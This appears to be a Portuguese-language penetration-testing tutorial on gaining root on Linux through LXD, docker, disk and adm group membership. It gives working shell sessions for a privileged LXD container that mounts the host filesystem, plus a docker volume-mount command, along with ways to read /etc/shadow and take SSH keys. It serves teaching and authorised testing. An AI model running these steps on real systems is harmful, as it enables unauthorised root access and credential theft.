## LXC / LXD

É o gerenciador de contêineres do Ubuntu. Após a instalação, todos os usuários são adicionados ao grupo LXD. A associação a esse grupo pode ser usada para escalar privilégios criando um contêiner LXD, tornando-o privilegiado e, em seguida, acessando o sistema de arquivos do host em `/mnt/root`.

```shell-session
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

Descompacte a imagem Alpine.

```shell-session
devops@NIX02:~$ unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine/
```

Inicie o processo de inicialização do LXD. Escolha os padrões para cada prompt. Consulte esta [postagem](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) para obter mais informações sobre cada etapa.

```shell-session
devops@NIX02:~$ lxd init

Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes

/usr/sbin/dpkg-reconfigure must be run as root
error: Failed to configure the bridge
```

Importe a imagem local.

```shell-session
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b
```

Inicie um contêiner privilegiado com o conjunto  `security.privileged` como `true` para executar o contêiner sem um mapeamento de UID, tornando o usuário root no contêiner o mesmo que o usuário root no host.

```shell-session
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true

Creating r00t
```

Monte o sistema de arquivos host.

```shell-session
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Device mydev added to r00t
```

Por fim, gere um shell dentro da instância do contêiner. Agora podemos navegar pelo sistema de arquivos do host montado como root. Por exemplo, para acessar o conteúdo do diretório root no host, digite `cd /mnt/root/root`. 

A partir daqui, podemos ler arquivos sensíveis como `/etc/shadow`e obter hashes de senha ou obter acesso a chaves SSH para conectar ao sistema host como root e muito mais.

```shell-session
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ # 
```

## Docker
Colocar um usuário no grupo docker é essencialmente equivalente ao acesso de nível root ao sistema de arquivos sem exigir uma senha. Membros do grupo docker podem gerar novos contêineres docker. Um exemplo seria executar o comando `docker run -v /root:/mnt -it ubuntu`.

Este comando cria uma nova instância do Docker com o diretório /root no sistema de arquivos host montado como um volume. Depois que o contêiner é iniciado, podemos navegar até o diretório montado e recuperar ou adicionar chaves SSH para o usuário root.

Isso pode ser feito para outros diretórios, como `/etc` que podem ser usados ​​para recuperar o conteúdo do `/etc/shadow`arquivo para quebra de senha offline ou adição de um usuário privilegiado.

## Disk

Usuários dentro do grupo de disco têm acesso total a quaisquer dispositivos contidos em `/dev`, como `/dev/sda1`, que normalmente é o dispositivo principal usado pelo sistema operacional.

Um invasor com esses privilégios pode usar `debugfs`para acessar todo o sistema de arquivos com privilégios de nível root. Assim como no exemplo do grupo Docker, isso pode ser aproveitado para recuperar chaves SSH, credenciais ou para adicionar um usuário.

## ADM
Os membros do grupo adm podem ler todos os logs armazenados em `/var/log`. Isso não concede acesso root diretamente, mas pode ser aproveitado para reunir dados sensíveis armazenados em arquivos de log ou enumerar ações do usuário e executar tarefas cron.

```shell-session
secaudit@NIX02:~$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```



































































